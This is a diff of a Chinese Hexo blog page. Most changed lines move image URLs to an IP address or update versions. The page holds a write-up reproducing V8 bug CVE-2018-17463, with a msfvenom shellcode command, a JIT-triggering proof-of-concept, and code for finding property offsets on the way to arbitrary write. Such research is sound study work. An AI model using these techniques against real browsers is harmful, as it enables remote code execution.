@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 4.2.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -30,17 +30,17 @@
 <meta property="og:site_name" content="Hcl的个人小站">
 <meta property="og:description" content="这是一个关于chromium的v8引擎漏洞，跟着复现一下，顺便了解浏览器漏洞的挖掘方法。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414004028256474580d7b43b4cd6.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-202004140042141908b3b71d757d4ce74.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200413195126439236f779dc40d4d2d.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200413195149228b3d93a35f4960abd.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-202004140030582015ce146584a2752c1.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414003311934f4a17ceb4502a82b.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414132308805541e4bdd7608cb10.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414150541447399b26eba261e723.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-202004141537416604c0d9674bd26c5ce.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414153812356368ec5a4fdfa4b91.png">
-<meta property="og:image" content="http://sz.guiu.xyz/images/image-20200414154238022cfa426a0c693c0de.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414004028256474580d7b43b4cd6.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-202004140042141908b3b71d757d4ce74.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200413195126439236f779dc40d4d2d.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200413195149228b3d93a35f4960abd.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-202004140030582015ce146584a2752c1.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414003311934f4a17ceb4502a82b.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414132308805541e4bdd7608cb10.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414150541447399b26eba261e723.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-202004141537416604c0d9674bd26c5ce.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414153812356368ec5a4fdfa4b91.png">
+<meta property="og:image" content="http://47.107.37.206/images/image-20200414154238022cfa426a0c693c0de.png">
 <meta property="article:published_time" content="2020-04-14T15:02:43.000Z">
 <meta property="article:modified_time" content="2020-04-14T15:02:43.000Z">
 <meta property="article:author" content="guiu">
@@ -48,7 +48,7 @@
 <meta property="article:tag" content="cve">
 <meta property="article:tag" content="漏洞挖掘">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://sz.guiu.xyz/images/image-20200414004028256474580d7b43b4cd6.png">
+<meta name="twitter:image" content="http://47.107.37.206/images/image-20200414004028256474580d7b43b4cd6.png">
 
 <link rel="canonical" href="http://guiu.xyz/p/9e20141d.html">
 
@@ -263,11 +263,11 @@
         <p>这是一个关于chromium的v8引擎漏洞，跟着复现一下，顺便了解浏览器漏洞的挖掘方法。</p>
 <a id="more"></a>
 <h1>搜集资料</h1>
-<p><img src="http://sz.guiu.xyz/images/image-20200414004028256474580d7b43b4cd6.png" alt="image-20200414004028256"></p>
+<p><img src="http://47.107.37.206/images/image-20200414004028256474580d7b43b4cd6.png" alt="image-20200414004028256"></p>
 <blockquote>
 <p>漏洞存在于<code>src/compiler/js-operator.cc:625</code>。在此处，代码定义了许多常见<code>IR</code>操作的标识，存在问题的是对<code>JSCreateObject</code>操作的判断。</p>
 </blockquote>
-<p><img src="http://sz.guiu.xyz/images/image-202004140042141908b3b71d757d4ce74.png" alt="image-20200414004214190"></p>
+<p><img src="http://47.107.37.206/images/image-202004140042141908b3b71d757d4ce74.png" alt="image-20200414004214190"></p>
 <h1>准备环境</h1>
 <p><strong>实验环境：kali linux</strong></p>
 <h2 id="安装depot-tools"><a class="header-anchor" href="#安装depot-tools"></a>安装depot_tools</h2>
@@ -298,8 +298,8 @@
 <p>考虑是因为拉取代码的问题（毕竟404），重来，<code>fetch v8</code> 重新拉取代码。</p>
 <p><strong>发现回退版本编译还是失败，使用最新版本编译成功。</strong></p>
 <p>切回master分支，对比该文件，发现<code>split_static_library.gni</code>已经在后面的更新中被移除了，查看发现build文件夹为另一个git子模块，且已经更新到最新（2020.3.1）。</p>
-<p><img src="http://sz.guiu.xyz/images/image-20200413195126439236f779dc40d4d2d.png" alt="image-20200413195126439"></p>
-<p><img src="http://sz.guiu.xyz/images/image-20200413195149228b3d93a35f4960abd.png" alt="image-20200413195149228"></p>
+<p><img src="http://47.107.37.206/images/image-20200413195126439236f779dc40d4d2d.png" alt="image-20200413195126439"></p>
+<p><img src="http://47.107.37.206/images/image-20200413195149228b3d93a35f4960abd.png" alt="image-20200413195149228"></p>
 <p>那么把报错这行改掉？</p>
 <p>失败。</p>
 <p>那将需要的这个文件加回去？（谷歌快照找到了这个文件的内容），加回去仍然失败。</p>
@@ -316,10 +316,10 @@
 <p>可见成功，但是没有跳出<code>calculater</code>，可能<code>ubuntu</code>和<code>kali</code>开启计算器的命令不一样，那换个<code>shellcode</code>：</p>
 <p><code>msf</code>生成<code>shellcode</code>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec CMD=screenfetch -f num</span><br></pre></td></tr></table></figure>
-<p><img src="http://sz.guiu.xyz/images/image-202004140030582015ce146584a2752c1.png" alt="image-20200414003058201"></p>
+<p><img src="http://47.107.37.206/images/image-202004140030582015ce146584a2752c1.png" alt="image-20200414003058201"></p>
 <p>计算器始终打不开（<code>GTK</code>的问题），<code>shellcode</code>就用了<code>screenfetch</code>代替</p>
 <p>exp：</p>
-<p><img src="http://sz.guiu.xyz/images/image-20200414003311934f4a17ceb4502a82b.png" alt="image-20200414003311934"></p>
+<p><img src="http://47.107.37.206/images/image-20200414003311934f4a17ceb4502a82b.png" alt="image-20200414003311934"></p>
 <p>成功，换<code>bash</code>也成功了。</p>
 <p>问题：</p>
 <p>切换到指定分支之后无法编译。</p>
@@ -348,7 +348,7 @@
 </ul>
 </blockquote>
 <figure class="highlight js"><figcaption><span>poc2.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;<span class="attr">x</span> : <span class="number">1</span>&#125;;</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="built_in">Object</span>.create(a);</span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure>
-<p><img src="http://sz.guiu.xyz/images/image-20200414132308805541e4bdd7608cb10.png" alt="image-20200414132308805"></p>
+<p><img src="http://47.107.37.206/images/image-20200414132308805541e4bdd7608cb10.png" alt="image-20200414132308805"></p>
 <p><code>ObjectCreate()</code>会把一个<code>Object</code>全部的属性值都放到<code>properties</code>中存储，并将原先的线性结构改成<code>hash</code>表的字典结构。</p>
 <h2 id="利用"><a class="header-anchor" href="#利用"></a>利用</h2>
 <p><strong>真正的漏洞在于：</strong></p>
@@ -361,19 +361,19 @@
 <h3 id="验证poc"><a class="header-anchor" href="#验证poc"></a>验证poc</h3>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_vul</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bad_create</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        x.a;</span><br><span class="line">        <span class="built_in">Object</span>.create(x);</span><br><span class="line">        <span class="keyword">return</span> x.b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> x = &#123;<span class="attr">a</span> : <span class="number">0x1234</span>&#125;;</span><br><span class="line">        x.b = <span class="number">0x5678</span>; </span><br><span class="line">        <span class="keyword">let</span> res = bad_create(x);</span><br><span class="line">        <span class="comment">//log(res);</span></span><br><span class="line">        <span class="keyword">if</span>( res != <span class="number">0x5678</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"CVE-2018-17463 exists in the d8"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"bad d8 version"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">check_vul();</span><br></pre></td></tr></table></figure>
 <p>执行结果：</p>
-<p><img src="http://sz.guiu.xyz/images/image-20200414150541447399b26eba261e723.png" alt="image-20200414150541447"></p>
+<p><img src="http://47.107.37.206/images/image-20200414150541447399b26eba261e723.png" alt="image-20200414150541447"></p>
 <p>即会在5000多次调用之后执行<code>JIT</code>优化，触发漏洞。</p>
 <p>此时虽然可以触发漏洞，但是**想要利用漏洞执行任意代码，还需要让其找到对应属性的偏移地址，才能进行后续的利用。**而且由于<code>DictionaryProperties</code>是一个哈希表，每次执行时对应属性的偏移地址在不断变化。</p>
 <p>验证：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a1 = &#123;<span class="attr">x</span> : <span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>&#125;;</span><br><span class="line">a1.b = <span class="number">4</span>;</span><br><span class="line">a1.c = <span class="number">5</span>;</span><br><span class="line">a1.d = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">let</span> a2 = &#123;<span class="attr">u</span> : <span class="number">2</span>,<span class="attr">v</span>:<span class="number">3</span>,<span class="attr">w</span>:<span class="number">4</span>&#125;;</span><br><span class="line">a2.e = <span class="number">7</span>;</span><br><span class="line">a2.f = <span class="number">8</span>;</span><br><span class="line">a2.g = <span class="number">9</span>;</span><br><span class="line"><span class="built_in">Object</span>.create(a1);</span><br><span class="line">%DebugPrint(a1);</span><br><span class="line"><span class="built_in">Object</span>.create(a2);</span><br><span class="line">%DebugPrint(a2);</span><br><span class="line">readline();</span><br></pre></td></tr></table></figure>
 <p>第一次（以<code>a2</code>为例）：</p>
-<p><img src="http://sz.guiu.xyz/images/image-202004141537416604c0d9674bd26c5ce.png" alt="image-20200414153741660"></p>
+<p><img src="http://47.107.37.206/images/image-202004141537416604c0d9674bd26c5ce.png" alt="image-20200414153741660"></p>
 <p>第二次：</p>
-<p><img src="http://sz.guiu.xyz/images/image-20200414153812356368ec5a4fdfa4b91.png" alt="image-20200414153812356"></p>
+<p><img src="http://47.107.37.206/images/image-20200414153812356368ec5a4fdfa4b91.png" alt="image-20200414153812356"></p>
 <p>找到另一个规律：</p>
 <p>在同一次执行过程中，相同属性构造的<code>Object</code>，在<code>DictionaryProperties</code>中的偏移是相同的，验证：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a1 = &#123;<span class="attr">x</span> : <span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>&#125;;</span><br><span class="line">a1.b = <span class="number">4</span>;</span><br><span class="line">a1.c = <span class="number">5</span>;</span><br><span class="line">a1.d = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">let</span> a2 = &#123;<span class="attr">x</span> : <span class="number">2</span>,<span class="attr">y</span>:<span class="number">3</span>,<span class="attr">z</span>:<span class="number">4</span>&#125;;</span><br><span class="line">a2.b = <span class="number">7</span>;</span><br><span class="line">a2.c = <span class="number">8</span>;</span><br><span class="line">a2.d = <span class="number">9</span>;</span><br><span class="line"><span class="built_in">Object</span>.create(a1);</span><br><span class="line">%DebugPrint(a1);</span><br><span class="line"><span class="built_in">Object</span>.create(a2);</span><br><span class="line">%DebugPrint(a2);</span><br><span class="line">readline();</span><br></pre></td></tr></table></figure>
-<p><img src="http://sz.guiu.xyz/images/image-20200414154238022cfa426a0c693c0de.png" alt="image-20200414154238022"></p>
+<p><img src="http://47.107.37.206/images/image-20200414154238022cfa426a0c693c0de.png" alt="image-20200414154238022"></p>
 <p>那么就很简单了，把每次执行的所有属性值记下来，然后当触发漏洞时，根据属性值找到对应的属性名，即确定了一对在属性改变前后可以对应的属性名，以达到恶意函数返回<code>a.x1</code>，实质上是返回<code>a.x2</code>的目的。</p>
 <p>假设上面得到的键值对为<code>X</code>和<code>Y</code>。则构建一个全新的<code>Object</code>：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o.X = &#123;<span class="attr">x1</span>:<span class="number">1.1</span>,<span class="attr">x2</span>:<span class="number">1.2</span>&#125;;</span><br><span class="line">o.Y = &#123;<span class="attr">y1</span>:obj&#125;;</span><br></pre></td></tr></table></figure>
@@ -426,7 +426,10 @@
     <a href="/p/ab70f304.html" rel="prev" title="python编写typora插件实现传图到chevereto">
       <i class="fa fa-chevron-left"></i> python编写typora插件实现传图到chevereto
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/p/dedf6615.html" rel="next" title="给charles添加url分类导出的功能">
+      给charles添加url分类导出的功能 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -486,7 +489,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">搜集资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">准备环境</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装depot-tools"><span class="nav-number">2.1.</span> <span class="nav-text">安装depot_tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构建v8引擎"><span class="nav-number">2.2.</span> <span class="nav-text">构建v8引擎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#踩坑记录"><span class="nav-number">2.2.1.</span> <span class="nav-text">踩坑记录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">开始分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#调试v8引擎"><span class="nav-number">3.1.</span> <span class="nav-text">调试v8引擎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#v8引擎调试环境："><span class="nav-number">3.1.1.</span> <span class="nav-text">v8引擎调试环境：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原因分析："><span class="nav-number">3.2.</span> <span class="nav-text">漏洞原因分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用步骤"><span class="nav-number">3.3.1.</span> <span class="nav-text">利用步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证poc"><span class="nav-number">3.3.2.</span> <span class="nav-text">验证poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址写操作"><span class="nav-number">3.3.3.</span> <span class="nav-text">任意地址写操作</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text">搜集资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">2.</span> <span class="nav-text">准备环境</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装depot-tools"><span class="nav-number">2.1.</span> <span class="nav-text">安装depot_tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构建v8引擎"><span class="nav-number">2.2.</span> <span class="nav-text">构建v8引擎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#踩坑记录"><span class="nav-number">2.2.1.</span> <span class="nav-text">踩坑记录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">3.</span> <span class="nav-text">开始分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#调试v8引擎"><span class="nav-number">3.1.</span> <span class="nav-text">调试v8引擎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#v8引擎调试环境："><span class="nav-number">3.1.1.</span> <span class="nav-text">v8引擎调试环境：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原因分析："><span class="nav-number">3.2.</span> <span class="nav-text">漏洞原因分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用步骤"><span class="nav-number">3.3.1.</span> <span class="nav-text">利用步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证poc"><span class="nav-number">3.3.2.</span> <span class="nav-text">验证poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址写操作"><span class="nav-number">3.3.3.</span> <span class="nav-text">任意地址写操作</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -502,7 +505,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -515,7 +518,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -544,7 +547,7 @@
 
   
   &copy; 2019 – 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
 
   <span class="with-love">
     <i class="fa fa-user"></i>
@@ -552,7 +555,7 @@
   <span class="author" itemprop="copyrightHolder">guiu</span>
 
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.1
   </div>
   <span class="post-meta-divider">|</span>
   <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
